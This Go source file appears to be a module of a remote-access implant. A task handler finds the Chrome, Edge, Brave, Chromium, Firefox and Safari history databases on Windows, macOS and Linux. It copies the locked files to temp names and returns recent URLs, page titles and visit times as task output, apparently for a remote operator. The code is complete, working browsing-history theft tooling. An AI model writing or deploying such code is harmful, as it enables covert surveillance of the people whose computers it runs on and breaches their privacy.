//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"crypto/rand"
	"database/sql"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	_ "modernc.org/sqlite"
)

const (
	historyMaxDBBytes = 64 << 20
	historyMaxRows    = 200
)

type historyStore struct {
	Name   string
	Kind   string // chromium | firefox | safari
	Filter string
	Paths  []string
}

func handleBrowserHistory(task Task, res *TaskResult) {
	out := exportBrowserHistory(task.Command)
	res.Output = out
}

func historyNonce() string {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		return fmt.Sprintf("%d", time.Now().UnixNano())
	}
	return hex.EncodeToString(b)
}

func chromeTimeToTime(us int64) time.Time {
	if us <= 0 {
		return time.Time{}
	}
	unix := us/1e6 - 11644473600
	nsec := (us % 1e6) * 1e3
	return time.Unix(unix, nsec).UTC()
}

func firefoxTimeToTime(us int64) time.Time {
	if us <= 0 {
		return time.Time{}
	}
	return time.Unix(0, us*1000).UTC()
}

func cocoaTimeToTime(sec float64) time.Time {
	if sec <= 0 {
		return time.Time{}
	}
	return time.Unix(int64(sec)+978307200, 0).UTC()
}

func historyCandidates() []historyStore {
	switch runtime.GOOS {
	case "windows":
		la := os.Getenv("LOCALAPPDATA")
		ro := os.Getenv("APPDATA")
		return []historyStore{
			{Name: "Chrome", Kind: "chromium", Filter: "chrome", Paths: []string{filepath.Join(la, `Google\Chrome\User Data\Default\History`)}},
			{Name: "Edge", Kind: "chromium", Filter: "edge", Paths: []string{filepath.Join(la, `Microsoft\Edge\User Data\Default\History`)}},
			{Name: "Brave", Kind: "chromium", Filter: "brave", Paths: []string{filepath.Join(la, `BraveSoftware\Brave-Browser\User Data\Default\History`)}},
			{Name: "Firefox", Kind: "firefox", Filter: "firefox", Paths: firefoxProfileDBs(filepath.Join(ro, `Mozilla\Firefox\Profiles`), "places.sqlite")},
		}
	case "darwin":
		home := os.Getenv("HOME")
		return []historyStore{
			{Name: "Chrome", Kind: "chromium", Filter: "chrome", Paths: []string{filepath.Join(home, "Library/Application Support/Google/Chrome/Default/History")}},
			{Name: "Edge", Kind: "chromium", Filter: "edge", Paths: []string{filepath.Join(home, "Library/Application Support/Microsoft Edge/Default/History")}},
			{Name: "Brave", Kind: "chromium", Filter: "brave", Paths: []string{filepath.Join(home, "Library/Application Support/BraveSoftware/Brave-Browser/Default/History")}},
			{Name: "Firefox", Kind: "firefox", Filter: "firefox", Paths: firefoxProfileDBs(filepath.Join(home, "Library/Application Support/Firefox/Profiles"), "places.sqlite")},
			{Name: "Safari", Kind: "safari", Filter: "safari", Paths: []string{filepath.Join(home, "Library/Safari/History.db")}},
		}
	default:
		home := os.Getenv("HOME")
		return []historyStore{
			{Name: "Chrome", Kind: "chromium", Filter: "chrome", Paths: []string{filepath.Join(home, ".config/google-chrome/Default/History")}},
			{Name: "Chromium", Kind: "chromium", Filter: "chrome", Paths: []string{filepath.Join(home, ".config/chromium/Default/History")}},
			{Name: "Edge", Kind: "chromium", Filter: "edge", Paths: []string{filepath.Join(home, ".config/microsoft-edge/Default/History")}},
			{Name: "Brave", Kind: "chromium", Filter: "brave", Paths: []string{filepath.Join(home, ".config/BraveSoftware/Brave-Browser/Default/History")}},
			{Name: "Firefox", Kind: "firefox", Filter: "firefox", Paths: firefoxProfileDBs(filepath.Join(home, ".mozilla/firefox"), "places.sqlite")},
		}
	}
}

func firefoxProfileDBs(dir, filename string) []string {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil
	}
	var paths []string
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		p := filepath.Join(dir, e.Name(), filename)
		if _, err := os.Stat(p); err == nil {
			paths = append(paths, p)
		}
	}
	return paths
}

func exportBrowserHistory(filter string) string {
	filter = strings.ToLower(strings.TrimSpace(filter))
	if filter == "" {
		filter = "all"
	}
	var sb strings.Builder
	sb.WriteString("=== browser history (URLs/titles only, capped) ===\n")
	matched := 0
	for _, store := range historyCandidates() {
		if filter != "all" && filter != store.Filter && filter != strings.ToLower(store.Name) {
			continue
		}
		matched++
		written := false
		for _, p := range store.Paths {
			if _, err := os.Stat(p); err != nil {
				continue
			}
			sb.WriteString(queryHistoryStore(store, p))
			written = true
		}
		if !written {
			fmt.Fprintf(&sb, "=== %s ===\n(not found)\n", store.Name)
		}
	}
	if matched == 0 {
		return "browser_history: unknown browser filter (chrome, edge, brave, firefox, safari, all)\n"
	}
	return sb.String()
}

func copyLockedDB(src string) (string, error) {
	fi, err := os.Stat(src)
	if err != nil {
		return "", err
	}
	if fi.Size() > historyMaxDBBytes {
		return "", fmt.Errorf("history db too large (%d bytes, cap %d)", fi.Size(), historyMaxDBBytes)
	}
	dst := filepath.Join(os.TempDir(), fmt.Sprintf("%s_%s_hist.db", persistencePrefix, historyNonce()))
	in, err := os.Open(src)
	if err != nil {
		return "", err
	}
	defer in.Close()
	out, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o600)
	if err != nil {
		return "", err
	}
	_, copyErr := io.Copy(out, io.LimitReader(in, historyMaxDBBytes+1))
	closeErr := out.Close()
	if copyErr != nil {
		os.Remove(dst)
		return "", copyErr
	}
	if closeErr != nil {
		os.Remove(dst)
		return "", closeErr
	}
	return dst, nil
}

func queryHistoryStore(store historyStore, src string) string {
	tmp, err := copyLockedDB(src)
	if err != nil {
		return fmt.Sprintf("=== %s ===\n%s: %v\n", store.Name, src, err)
	}
	defer os.Remove(tmp)

	db, err := sql.Open("sqlite", tmp)
	if err != nil {
		return fmt.Sprintf("=== %s ===\nsqlite open: %v\n", store.Name, err)
	}
	defer db.Close()

	var sb strings.Builder
	fmt.Fprintf(&sb, "=== %s (%s) ===\n", store.Name, src)
	switch store.Kind {
	case "chromium":
		rows, err := db.Query(`SELECT url, IFNULL(title,''), visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?`, historyMaxRows)
		if err != nil {
			fmt.Fprintf(&sb, "query: %v\n", err)
			return sb.String()
		}
		defer rows.Close()
		n := 0
		for rows.Next() {
			var url, title string
			var visits, chromeUS int64
			if rows.Scan(&url, &title, &visits, &chromeUS) != nil {
				continue
			}
			fmt.Fprintf(&sb, "%s\t%d\t%s\t%s\n", chromeTimeToTime(chromeUS).Format(time.RFC3339), visits, url, strings.ReplaceAll(title, "\t", " "))
			n++
		}
		fmt.Fprintf(&sb, "# rows=%d\n", n)
	case "firefox":
		rows, err := db.Query(`SELECT url, IFNULL(title,''), visit_count, IFNULL(last_visit_date,0) FROM moz_places WHERE hidden=0 ORDER BY last_visit_date DESC LIMIT ?`, historyMaxRows)
		if err != nil {
			fmt.Fprintf(&sb, "query: %v\n", err)
			return sb.String()
		}
		defer rows.Close()
		n := 0
		for rows.Next() {
			var url, title string
			var visits, us int64
			if rows.Scan(&url, &title, &visits, &us) != nil {
				continue
			}
			fmt.Fprintf(&sb, "%s\t%d\t%s\t%s\n", firefoxTimeToTime(us).Format(time.RFC3339), visits, url, strings.ReplaceAll(title, "\t", " "))
			n++
		}
		fmt.Fprintf(&sb, "# rows=%d\n", n)
	case "safari":
		rows, err := db.Query(`SELECT i.url, v.visit_time FROM history_visits v JOIN history_items i ON v.history_item = i.id ORDER BY v.visit_time DESC LIMIT ?`, historyMaxRows)
		if err != nil {
			fmt.Fprintf(&sb, "query: %v\n", err)
			return sb.String()
		}
		defer rows.Close()
		n := 0
		for rows.Next() {
			var url string
			var visit float64
			if rows.Scan(&url, &visit) != nil {
				continue
			}
			fmt.Fprintf(&sb, "%s\t%s\n", cocoaTimeToTime(visit).Format(time.RFC3339), url)
			n++
		}
		fmt.Fprintf(&sb, "# rows=%d\n", n)
	default:
		fmt.Fprintf(&sb, "unknown store kind %s\n", store.Kind)
	}
	return sb.String()
}
